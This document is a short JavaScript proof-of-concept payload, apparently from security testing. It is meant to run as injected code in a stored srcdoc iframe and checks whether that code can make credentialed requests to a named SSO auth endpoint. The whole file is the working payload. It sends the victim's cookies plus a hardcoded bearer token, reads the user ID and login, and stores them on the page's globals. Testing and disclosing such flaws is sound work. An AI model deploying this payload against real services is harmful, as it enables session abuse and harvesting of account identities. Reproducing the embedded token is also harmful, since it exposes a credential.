// r15 PoC canary v2 — benign. Tests whether attacker code in the stored srcdoc iframe has
// FIRST-PARTY credentialed authority on the sso.pub auth origin (does the SameSite=Strict DS
// cookie attach to a credentialed fetch issued from this context?).
(async function(){
  var o={ran:true, self_origin:(function(){try{return self.origin}catch(e){return 'ERR'}})(),
         loc_origin:location.origin, href:location.href, me_status:null, me_id:null, me_login:null};
  try{
    var r=await fetch('https://auth.sso.pub.databricks.com/v1/auth/me',{credentials:'include',
      headers:{'Authorization':'Bearer P2fI1vZEAVlmwTIExz7Aec6Y0lLV'}});
    o.me_status=r.status; var t=await r.text();
    try{var j=JSON.parse(t); o.me_id=j.userId; o.me_login=(j.loginIds||[])[0];}catch(e){o.me_body=t.slice(0,120);}
  }catch(e){ o.me_err=String(e); }
  try{window.__r15poc2=o;}catch(e){}
  try{window.top.__r15poc2=o;}catch(e){}
})();
